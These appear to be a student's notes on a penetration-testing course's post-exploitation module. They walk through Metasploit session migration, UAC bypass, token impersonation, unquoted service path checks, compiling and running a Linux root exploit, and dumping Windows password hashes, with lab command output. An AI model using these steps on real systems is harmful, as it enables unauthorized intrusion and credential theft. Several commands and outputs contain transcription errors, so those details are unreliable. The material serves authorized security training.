# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# Network Security
# Module 6 - Post Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_2/module_6/html/index.html

__________________________
###### Module Map
1. Introduction
2. Privilege Escalation and Maintaining Access
3. Pillaging
4. Mapping the internal network
5. Exploitation through Pivoting

__________________________
## 6.1. Introduction
Post-exploitation is the last technical stage of Penetration testing process (before reporting phase).

The Post Exploitation encompasses all the activities that the penetration tester undertakes when the target system has been compromised: determine the machine value and the network infrastructure, maintain access, gather information, and so on.

In other words, what you do, or have to do, when you get access on the target.

It is important to know that these activities are not always the same depending on what kind of access you have, what system you have compromised, how stealthy you need to be, and so on.

This means that we will run different activities, task, and tools on Windows and Linux OS.

Moreover, you should never forget about the rules of the engagement.

When running post-exploitation tasks, be sure you have the permissions, and the right to modify services, machine configurations, escalate privileges, gather sensitive information, delete logs, and so on.

###### Record your changes
  You should always keep track of actions taken against the compromised machines. This includes date and time, changes made to machines documents, services, applications, and configurations, but also private data discovered, methods used to maintain access, and so on.

  This information (containing the list of changes made) should then be included in the final report.

###### Handling Information
  All data discovered and gathered must be protected. This means that you must encrypt it on your pentesting machine, and permanently delete it once the pentest is completed.

  Even when reporting sensitive information to your client, such as a screenshot containing username or passwords, be sure to always obfuscate and mask data.

###### Maintaining Access Clean-up
  As you will see later on, one of the first steps you will run once you compromise a machine is *maintain access* or persistence. It allows you to get back on the machine whenever you want: usually a backdoor on the system.

  When using such methods, implement some type of authentication (in order to avoid others from using it) and delete everything once the pentest is complete.

###### Permanent Edits
  Another important thing you should be aware of is how to handle permanent changes on the exploited system.

  If the rule of engagements permits these edits, and if you are going to delete logs from the remote machine, be sure to back them up before actually deleting or modifying them.

###### Methodology
In order to run a thorough and complete post-exploitation phase, we propose a methodology that you can apply during your engagements.

  This is a cyclic process composed of 4 steps.
    1. Privilege Escalation and Maintaining Access
    2. Data Harvesting
    3. Internal Network Scan
    4. Exploitation of New Systems and Pivoting

  Note that this is a cyclic process due to the fact that you could discover new networks, new hosts, new targets, and then get access to them trough exploitation.

  Moreover, note that each host you compromise can store and provide information that others do not store.

  The post-exploitation phase really allows you to infiltrate an entire network instead of just a single host.

In the next section, we will analyze each step in the process and see what tools, commands, and activities a penetration tester can use in each step of the Post-Exploitation process.

__________________________
## 6.2. Privilege Escalation and Maintaining Access
The first task is to perform **Privilege Escalation and Maintaining Access**.

Before actually seeing the attack methods and techniques that we can use in this phase, let's shine some light on what we mean with privilege escalation, what types of privilege escalation exist and what local exploits are (we introduced them in the previous module)

#### 6.2.1. Privilege Escalation
Privilege Escalation is an attack that exploits OS or third-party software vulnerabilities (bugs, design flaws, etc.) in order to elevate the current access (privileges) to protected resources.

  In other words, the attacker is able to gain unauthorized access to resources that (s)he is not supposed to access.

Types of Privilege Escalation:
 - Vertical <br>
    The attacker is able to move from a lower-privileged user to a higher privileged user. For example from a low-end user to administration or root user.

    Example:<br>
      On a Linux OS, the attacker is able to escalate privileges from a user (i.e. applications) and gain root privileges

 - Horizontal <br>
    The attacker keeps the same set or level of privileges, but assumes the identity of a different user (he/she does not gain any further privilege)

    Example: <br>
      On a Windows OS, the attacker is able to assume the identity on any other *Standard User* on the system. The attacker is not escalating privileges from a Standard User to an Administrator User.

###### Local Exploit
  In the previous module, we explained client-side and remote exploits, but also introduced local exploits. Now let's see what these exploits are.

  Different from the other two, local exploits require prior access on the target system. Their goal is to exploit operating systems or applications vulnerabilities in order to increase privileges on the target machine.

Now that we know more about privilege escalation and local exploit, let us go back to our pen-testing process.
  The purpose of this phase is to **provide and secure access** to the target machine with the **highest privilege** on the machine.
  In the next steps, we will assume to already have a shell or a meterpreter session on our target.

To get some basic information on the current meterpreter session, we can run `sysinfo` command.
  Let's run it and see what we get.

  As you can see, we can read about the computer name (`ELS`), the current OS running on the exploited machine (Windows), its architecture (`x64`), domain name (`workgroup`), and also the architecture of the current meterpreter session process (`x86/win32`)
    ```
    meterpreter > sysinfo
    Computer        : ELS
    OS              : Windows 7 (Build 7601, Service Pack 1)
    Architecture    : x64 (Current Process is WOW64)
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/win32
    ```

  As you can imagine, there are many other commands and tools that we can use to get similar or more detailed information. For example, when dealing with a Windows machine we may want to run `systeminfo`, while on Linux machine we have plenty of commands to use: `lsb_release`, `uname`, `lscpu`, and more.

  We will inspect these later on, once we get a stable and persistent connection to the exploited machine.


Once we know the type of machine we are dealing with, we can thinking about our maintaining access activities.
  In this phase we will make sure that our session is:
    - Stable (does not get dropped)
    - Privileged (can run with high privileges)
    - Persistent (through reboots)

###### 6.2.1.1 Stable
One of the main issues when you get a meterpreter session on the target, is that the end user can kill the exploited process.
  It can happen, for example, when you exploit a client-side vulnerability through the web browser and the user just closes the web browser window.

  To avoid losing the session on the target, one of the first tasks to perform is to migrate the session to another process.

**Helpful commands**
  Before seeing the migrate command, it is useful to know that giving `help` command in meterpreter, or simply typing `?` and hitting enter, will list all commands and options.

  Moreover, we have very useful meterpreter scripts that we can execute during this phase of our penetration test.
    We can list them by typing `run` and then pressing `Tab` twice.

Back to our goal of making our session stable.
To let Metasploit automatically migrate to another process, you can use the following command (on Windows machine):
  ```
  run post/windows/manage/migrate
  ```
  Example:
    ```
    meterpreter > getpid
    Current pid: 2168
    meterpreter > run post/windows/manage/migrate

    [*] Running module against ELS
    [*] Current server process: win10.exe (2168)
    [*] Migrating to 1564
    [*] Successfully migrated to process 1564
    meterpreter > getpid
    Current pid: 1564
    meterpreter >
    ```

  As you can see, the meterpreter script automatically migrated to another process. It is important to know that the process on which it will migrate will always be a process with the same privileges as the current session and that the process name is `notepad.txt`.

  If we want to see the list of all process running on the machine we can execute the `ps` command (even if it is a Windows machine)

  Tip:
    Although the previous command works just fine, we can directly run `migrate` in the meterpreter session. This time however, we have to provide the process ID or the process name we want to migrate to.

    It will not automatically create and migrate to a new process.

    ```
    meterpreter > migrate -h
    Usage: migrate <<pid> | -P <pid> | -N <name>> [-t timeout]

    Migrates the server instance to another process.
    NOTE: Any open channels or other dynamic state will be lost.
    ```

###### 6.2.1.2. Privilege Escalation
Once we have migrated our session, we can start our Post-Exploitation process.
We will first want to make our access to the remote host persistent, in order to come back any time and have access to the machine.

However, most of the operations required to achieve a persistent access, also require our shell to run with the highest privileges.

Types of Privilege Escalation Based on its OS:
  1. Windows Privilege Escalation  
      The easiest and fastest way to get higher privileges is by running `getsystem` within meterpreter.
        It will automatically find the best technique to elevate privileges.

        By default, the `getsystem` tries all available techniques to escalate privileges.
        If a technique fails, it w ill try the next one until one of the available techniques works.

        If you want to run a specific technique, simply use the `-t` option as follow:
         ```
         getsystem -t 1
         ```

        Important:
          Notice that depending on the current privileges on the machine, the `getsystem` command may fail.
            For example, if you use this technique on systems with User Account Control (UAC) enabled (Windows Vista+), it would not work as well as systems like Windows XP.

            We need to use other techniques to get past this protection and then be able to successfully obtain system privileges.

          Moreover, you should be aware that `getsystem` works only against Windows OS.
          For different OS, you will have to rely on different Metasploit modules.

          If you want to know which modules Metasploit offers, you can navigate the `exploit/[OS]/local` path. We will see some of them later in the module.

        When UAC is enabled on the remote system, `bypassuac` is one of the modules we can use to bypass it.
          First of all, we can verify if UAC is enabled by running the module `post/windows/gather/win_privs`.

          If in the result the *UAC Enabled* column is set to true, it means that the remote system has the UAC enabled.

          As we can see in the following snapshot, UAC is enabled and we do not have Admin or System privilege on the machine. This means that running `getsystem` will most likely fail.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            False       False       True          1               "els\\els"

            Windows Privileges
            ==================

            Name
            ----
            SeChangeNotifyPrivilege
            SeShutdownPrivilege
            SeUndockPrivilege
            ```
          What we can do then is use some of the modules offered by Metasploit to bypass the UAC protection mechanism. We can list them by simply searching the string `bypassuac`:
            ```
            msf exploit(handler) > search bypassuac

            Matching Modules
            ================

              Name                                      Disclosure Date   Rank  Description
              ----                                      ---------------   ----  -----------
              exploit/windows/local/bypassuac           2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_injection 2010-12-31        excellent  Windows Escalate UAC Protection
              exploit/windows/local/bypassuac_vbs       2015-08-22        excellent  Windows Escalate UAC Protection
            ```

          The steps we will have to do are very easy:
            1. Select the `bypassuac_vbc` module, since it is the newest module
            2. Set the session ID on which the module will be executed
            3. Run the module

          If the module completes, we will get a new meterpreter session with highest privileges. Remember that this is a bypass, so UAC will still be enabled on  the target.

          The following summarized the step:
            ```
            msf exploit(handler) > user exploit/windows/local/bypassuac_vbs
            msf exploit(bypassuac_vbs) > sessions

            Active sessions
            ===============

              Id  Type                    Information     Connection
              --  ----                    -----------     ----------
              6   meterpreter x86/win32   elsels @ELS     192.168.102.147:4455 -> 192.168.102.157:1039 (192.168.102.157)

            msf exploit(bypassuac_vbs) > set SESSION 6
            SESSION => 6
            msf exploit(bypassuac_vbs) > exploit
            ```

          If the exploit succeed, we will obtain a new meterpreter session that has higher privileges on the machine. As we can see, running `win_priv` prints out we are Admin on it.
            ```
            meterpreter > run post/windows/gather/win_privs

            Current User
            ============

            Is Admin    Is System   UAC Enabled   Foreground ID   UID
            --------    ---------   -----------   -------------   ---
            True        False       True          1               "els\\els"
            ```

          We now have administrator privileges on the machine, but we do not yet have the highest privileges on the machine.
            What we can do is run `getsystem` once again in this new meterpreter session. This time it will work.
              ```
              meterpreter > getsystem
              ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > sysinfo
              Computer        : ELS
              OS              : Windows 7 (Build 7601, Service Pack 1)
              Architecture    : x64 (Current Process is WOW64)
              System Language : en_US
              Domain          : WORKGROUP
              ```

          **Incognito**
            A very powerful Meterpreter extension that we can use in this phase is [Incognito][https://www.gracefulsecurity.com/privesc-stealing-windows-access-tokens-incognito/].
            It was a standalone tool used to demonstrate security issues affecting [Windows tokens][https://technet.microsoft.com/en-us/library/cc759267(v=ws.10).aspx], but due to its functionality and features, it has been integrated in Metasploit.

            Thanks to incognito, we can impersonate other valid user tokens on that machine and became that user. The best thing is that we do not need to know or crack passwords to do this.

            As you can imagine, being able to switch from one user to another gives us the possibility to access different local or domain resources.

            Loading incognito is very simple. Once we have a meterpreter session (better with system privileges), we can run the following command to load the incognito extension
              ```
              meterpreter > use incognito
              Loading extension incognito...success.

              Incognito Commands
              ==================
                  Command             Description
                  -------             -----------
                  add_group_user      Attempt to add a user to a global group with all tokens
                  add_localgroup_user Attempt to add a user to a local group with all tokens
                  add_user            Attempt to add a user with all tokens
                  impersonate_token   Impersonate specified token
                  list_tokens         List tokens available under current user context
                  snarf_hashes        Snarf challenge/response hashes for every token
              ```

            Now we can list all available tokens with `list_tokens` or impersonate other user with `impersonate_token`:
              ```
              meterpreter > getuid
              Server username: NT AUTHORITY\SYSTEM
              meterpreter > list_tokens -u

              Delegation Tokens Available
              ================================================
              els\els
              els\user
              NT AUTHORITY\LOCAL SERVICE
              NT AUTHORITY\NETWORK SERVICE
              NT AUTHORITY\SYSTEM

              Impersonate Tokens Available
              ================================================
              NT AUTHORITY\ANONYMOUS LOGON
              ```

          **Unquoted Service Paths**
            [Unquoted Service Paths][https://cwe.mitre.org/data/definitions/428.html] are another method we can use for either persistence on a Windows target, or for escalating our privileges, depending on the circumstance.

              With Unquoted Service Paths vulnerabilities, we are able tot abuse the way that Windows searches for executables belonging to a service.

              In many cases, we can abuse this "search order" to obtain persistence to a system as the currently logged-on user, or escalate our privileges to SYSTEM.

                This issues arises when a Windows service has been configured with a path to a service binary which is unquoted (i.e. `C:\Users` instead of `"C:\Users"`), and additionally contains spaces in its path.

              When the path to the service binary is unquoted, as in the example service below, Windows will search for the service executable in the following order (i.e. : `C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe`):
                1. `C:\Program.exe`
                2. `C:\Program Files (x86)\Canon\IJ.exe`
                3. `C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe`

                this gives us two options in regard to an executable we can drop, and in which directory. In this case `C:\Program.exe` and `C:\Program Files (x86)\Canon\IJ.exe`

              Now, assuming that our current user would have the necessary permissions to write to the `C:\root`, or the Program Files `Canon` directory, we could place our own `Program.exe` or `IJ.exe` files respectively, and when the service starts, it would launch our executable, rather than the original `SETEVENT.exe` executable.

              Since the affected service runs a SYSTEM, we could have a SYSTEM shell in the case the system were to be rebooted, or the affected service restarted; In an example where our payload executable initiates a reverse TCP shell for instance.

            There are several different ways we can check for the existence of Unquoted Service Paths.
              We can do it either manually, or using third-party scripts or tools.

              One thing we can do is use the WMI Command line tool ([wmic][https://msdn.microsoft.com/en-us/library/aa394531(v=vs.85).aspx]) to query for all services and paths, specially searching for unquoted paths with the following command line:
                ```
                C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |finder /i /v """
                ```

              We can also use the `sc` ([Service Control][https://ss64.com/nt/sc.html]) command with the `qc` (Show Config) option to query a specific service, and manually check for an unquoted path:
                ```
                C:\>sc qc CIJSRegister
                [SC] QueryServiceIconConfig SUCCESS

                SERVICE_NAME: CIJSRegister
                        TYPE                : 10   WIN12 OWN PROCESS
                        START_TYPE          : 2    AUTO_START
                        ERROR_CONTROL       : 0    IGNORE
                        BINARY_PATH_NAME    : C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe
                        LOAD_ORDER_GROUP    :
                        TAG                 : 0
                        DISPLAY_NAME        : Canon IJ Scan Utility register event
                        DEPENDENCIES        :
                        SERVICE_START_NAME  : LocalSystem
                ```

              Metasploit also contains a module we can use to automatically exploit Unquoted Path-vulnerable instances of services as well.
                ```
                msf> use exploit/windows/local/trusted_service_path
                ```
                (See Video-64)

            (See Video-63)


  2. Linux Privilege Escalation
      Until now, we focus our privilege escalation activities on Windows OS. In the next slides, we will see how to achieve the same goals against Linux machines.

      Once again, we suppose that we already exploited the target machine and that we already have a shell or a session on it.

      Although Metasploit offers some privilege escalation modules for Linux OS, the best way to proceed is by getting information about the current OS and then searching for publicly available exploits.

      Notice that privilege escalation exploits are very OS specific, so information about the OS and the applications installed on the machine may results in very useful information to narrow down your search.

      Let's see an example of how we can escalate privileges on the following Linux machine. We already have a meterpreter session on it and we need to know more information about the OS running on it.
        ```
        meterpreter > sysinfo
        Computer      : ubuntu
        OS            : Linux ubuntu 3.16.0-30-generic #40-14.04.1-Ubuntu SMP Thru Jan
        Architecture  : i686
        Meterpreter   : x86/linux
        meterpreter > getuid
        Server username: uid=1000, gid=1000, euid=1000, suid=1000, sgid=1000
        meterpreter > run post/linux/gather/enum_system

        [+] Info:
        [+]     Ubuntu 14.04.2 LTS
        [+]     Linux ubuntu 3.16.0-30-generic #40-14.04.1-Ubuntu SMP Thru Jan 15
        [+]     Module running as "els" user
        ```

        From the previous snapshot, we can see that we have access to a Linux Ubuntu 14.04.2 LTS (32bit) machine. Moreover we can see we are actually running under the user named `els`.

      Our goal is to obtain highest privileges on the machine, which in this case means getting access as root. The most basic thing we can do is searching online for publicly available privilege escalation exploit.

        If we check our OS with + the keyword `privilege escalation`, there seems to be something available for our current system.

        Most of the time, you will find the source code of the exploit and you will have to compile it.

        If the remote machine has everything you need you can compile the exploit directly on the target, otherwise you will have to compile it on your own machine. In the latter case, be aware to use the correct configuration and select the right architecture.

        **Compile on the target**
          Let us suppose the target machine has everything we need, in other words, `gcc` is installed and we can compile the file.
          What we can do is upload the source file on the target, get a shell on it  through meterpreter and then compile the exploit.

          In order to upload the file, we just need to use the upload command that meterpreter already implements. We need to provide the local path of the exploit and then the remote path, where to upload the file:
            ```
            meterpreter > upload /home/stduser/Downloads/37292.c
            [*] uploading  : /home/stduser/Downloads/37292.c -> .
            [*] uploaded   : /home/stduser/Downloads/37292.c -> ./37292.c
            meterpreter > ls
            Listing: /home/els/Documents
            ============================

            Mode              Size  Type    Last Modified               Name
            ----              ----  ----    -------------               ----
            100664/rw-rw-r--  5123  fil     2016-02-24 12:05:21 -0500   37292.c
            ```

          Now let's get a terminal session with the `shell` command and then compile the source with `gcc`. The compiled exploit will be named exploit.
            ```
            meterpreter > shell
            Process 6010 created
            Channel 1 created.
            $ ls
            37292.c
            $ gcc 37292.c -o exploit
            $ ls -l
            total 20
            -rw-rw-r--  1 els els   5123 Feb 24 09:05 37292.c
            -rw-rwxr-x  1 els els  12149 Feb 24 09:07 exploit
            ```

          The last step now is to run the exploit.
          We simply do this with the following command : `$ ./exploit`
          As we can see, we are now running as root.

        **Compile on Our Machine**
          Supposing the target machine does not have `gcc`, we cannot compile the exploit there and we have to do it locally.

          Since the 2 machines are a bit different (our OS is 64-bit and the target is 32-bit), we need to set `gcc` parameters accordingly. Notice that installing all the required packages is outside the scope of this course, but you can find many resources online.

          The following is our machine architecture:
            `Linux els 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux`

          In order to compile the exploit we will use the following command:
            ```
            stduser@els:~/lin_exp$ gcc -m32 -o linux_priv_esc 37292.c
            stduser@els:~/lin_exp$ ls
            37292.c linux_priv_esc
            stduser@els:~/lin_exp$
            ```

          Now that we have the compiled version of the exploit, we can upload it via meterpreter with the `upload` command.
            ```
            meterpreter > upload /home/stduser/lin_exp/linux_priv_esc
            [*] uploading  : /home/stduser/lin_exp/linux_priv_esc -> .
            [*] uploaded   : /home/stduser/lin_exp/linux_priv_esc -> ./linux_priv_esc
            meterpreter > ls
            Listing: /home/els/Documents
            ============================

            Mode              Size    Type    Last modified             Name
            ----              ----    ----    -------------             ----
            100664/rw-rw-r--  9060    fil     2016-02-25 05:14:18 -0500 linux_priv_esc
            ```

          As we can see in the previous output, we also need to change the permission on the file and make it executable.

          We will spawn a shell on the machine and run everything from there.
            ```
            meterpreter > shell
            Process 6440 created.
            Channel 1 created.
            $ chmod +x linux_priv_esc
            $ whoami
            els
            $ ./linux_priv_esc
            spawning threads
            mount #1
            mount #2
            child threads done
            /etc/ld.so.preload created
            creating shared library
            # whoami
            root
            #
            ```

      What we have seen so far are privilege escalation techniques that exploit some kind of vulnerability in OS implementations, but there are other different ways we can get higher privileges on the machine.

      For example we may try to gather, dump or crack credentials related to administrators or root accounts.

      Another way to escalate privileges can be achieved by exploring permissions on process running on the machine.
        If there are services or processes running with higher privileges, there may be the possibility to inject malicious code in one of them and then be able to run commands or write data on the system with their privileges.

      Moreover, instead of injecting code directly in the application, you may also be able to escalate privileges by replacing files like DLLs or executables.
        This may happen if you have the right to write or edit files used by a service or process. You can replace these with your own version of the file and force the application to re-run and execute your code.

        Think about a service that is running with *system privileges* and its executable is stored in a folder on which we have write permissions.

        We can use `msfvenom` to create your payload (or inject it with tools like `Shellter`, `BDF`, and so on). After that we can replace the file with the one just created and force the service to start (for example with DoS attacks).

###### 6.2.1.3. Maintenance Access
So far we focused on how to escalate privileges on a compromised machine. Once we have higher privileges, we can move on to the next step: *Maintaining Access*

The purpose of this phase is to make our presence on the machine persistent - creating a backdoor readily available for later use.

We can use different techniques and tools to achieve this goal. Some are stealthier than others and some are only relevant to a particular OS.

We will study a few different methods to use during this phase, but remember that you can always improve and tweak them to your needs.

The following diagram summarizes the techniques we are going to use (see img-86):
  ```
                          Maintaining Access
                    ______________|______________
                    |             |             |
              Password Hash   Backdoor      New Users
          __________|___________                |
          |                    |                |
    Pass the Hash        Crack the Hash         |
          |                    |                |
           Services Such as RDP, VNC, Telnet ...
  ```

As you probably noticed, some of the techniques (such as RDP or VNC) require services for the connection. Before we start exploring them, note that there are different situations that you can face. For example:
    - Services are already active and we need credentials to establish connection
    - No services are in place: we need to activate them
    - For new users, we need to add them for each service (if they are already active, otherwise we have to activate them)

Let us start with one of the easiest techniques: **recovering the password hash**
1. Password Hash
  We are assuming that we already have a meterpreter session on the target machine (Windows 8.1) and that the session is running with the highest privileges (`SYSTEM`)

  The easiest way to dump the hashes from the [SAM Database][https://technet.microsoft.com/en-us/library/cc756748(v=ws.10).aspx] is by running the command `run hashdump`:
    ```
    meterpreter > run hashdump
    [*] Obtaining the boot key...
    [*] Calculating the hboot key using SYSKEY e9611aec85bc393d8a603ad3a7528e52
    [*] Obtaining the user list and keys..
    [*] Decrypting user keys...
    [*] Dumping password hints...

    No user with password hints on this system

    [*] Dumping password hashes..

    Administrator:500:aad3b4a61d8f14c86c48bc4acd1cf48b1a1468b4a86a168cf16:::
    Guest:501:89a498a9f8c4189b9c8a98c1b989bca8cb89498c149a1c899a:::
    els:1001:98bec19801a8ce10ce9a1911c1a951a0c1a8910c8ca1c9a19e:::
    ```

    As you have noticed we recovered all accounts and password hashes from the  target machine (Windows 8.1) by running as `SYSTEM`.

    Notice that depending on the OS version, we may be able to gather this information with even lower privileges, such as administrator accounts.

      In the following screenshot, we can see that running the same command with administrative privileges does not work.
      Indeed we get `Access denied` error.
        ```
        [*] Obtaining the boot key...
        [*] Calculating the hboot key using SYSKEY a6e1086fb186a10be86a80....
        [-] Meterpreter Exception: Rex::Post::Meterpreter::RequestError stdapi_registry_open_key: Operation failed: Access is denied
        [-] This script requires the use of a SYSTEM user context (hint: migrate service process)
        ```

      As metasploit suggests, we can try to migrate to a service process and re-run the command.




__________________________
## 6.3. Pillaging


__________________________
## 6.4. Mapping the internal network


__________________________
## 6.5. Exploitation through Pivoting


__________________________
